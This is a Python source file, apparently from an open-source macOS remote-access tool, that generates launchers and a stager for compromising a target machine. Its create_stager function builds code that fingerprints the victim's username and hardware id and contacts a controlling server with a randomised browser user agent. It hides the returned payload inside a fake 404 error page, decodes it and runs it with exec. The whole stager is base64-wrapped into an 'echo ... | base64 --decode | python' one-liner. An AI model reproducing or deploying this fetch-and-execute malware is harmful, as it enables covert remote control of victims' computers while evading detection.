# -*- coding: utf-8 -*-
"""Creates loaders using the factory pattern."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import imp
import json
import random
import string
from base64 import b64encode
from os import path, listdir
from textwrap import dedent

_module_cache = {}


def get_names():
    """:return: A list of available launchers."""
    launcher_names = []

    for filename in listdir(path.realpath(path.dirname(__file__))):
        if not filename.endswith(".py") or filename in ["__init__.py", "helper.py"]:
            continue
        else:
            launcher_names.append(filename.replace(".py", "", 1))

    return launcher_names


def _load_module(module_name):
    """Loads the module and adds it to the cache.

    :type module_name: str
    """
    # Going to use imp over importlib until python decides to remove it.
    module_path = path.realpath(path.join(path.dirname(__file__), module_name + ".py"))
    module = imp.load_source(module_name, module_path)

    _module_cache[module_name] = module

    return _module_cache[module_name]


def _get_random_user_agent():
    """
    :rtype: str
    :return: A random user agent.
    """
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
    ]
    return random.choice(user_agents)


def get_random_string(size=random.randint(6, 15), numbers=False):
    """
    :type size: int
    :type numbers: bool
    :rtype: str
    :return: A randomly generated string of x characters."""
    result = ""

    for i in range(0, size):
        if not numbers:
            result += random.choice(string.ascii_letters)
        else:
            result += random.choice(string.ascii_letters + string.digits)
    return result


def create_stager(server_host, server_port, loader_options):
    """
    :type server_host: str
    :type server_port: int
    :type loader_options: dict
    :rtype: str
    :return: The stager which the launcher will execute."""
    stager_host = "http://{}:{}".format(server_host, server_port)

    # Small piece of code which starts the staging process.
    # (Runs the loader returned by the server).
    stager_code = dedent("""\
    # -*- coding: utf-8 -*-
    import urllib2
    from base64 import b64encode, b64decode
    import getpass
    from uuid import getnode
    from binascii import hexlify


    def get_uid():
        return hexlify(getpass.getuser() + "-" + str(getnode()))


    {0} = "{1}"
    data = {{
        "Cookie": "session=" + b64encode(get_uid()) + "-{2}",
        "User-Agent": "{3}"
    }}

    try:
        request = urllib2.Request("{4}", headers=data)
        urllib2.urlopen(request).read()
    except urllib2.HTTPError as ex:
        if ex.code == 404:
            exec(b64decode(ex.read().split("DEBUG:\\n")[1].replace("DEBUG-->", "")))
        else:
            raise
    """.format(
        get_random_string(), get_random_string(numbers=True),
        b64encode("{}".format(json.dumps({
            "type": 0,
            "payload_options": {"host": server_host, "port": server_port},
            "loader_options": loader_options
        })).encode()).decode(),
        _get_random_user_agent(),
        stager_host
    ))

    return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())


def generate(launcher_name, stager):
    """
    :type launcher_name: str
    :type stager: str
    :return: A tuple containing the file extension and code of this launcher.
    :rtype: tuple
    """
    cached_launcher = _module_cache.get(launcher_name)

    if cached_launcher:
        return cached_launcher.Launcher().generate(stager)
    else:
        return _load_module(launcher_name).Launcher().generate(stager)


_module_cache["helper"] = _load_module("helper")
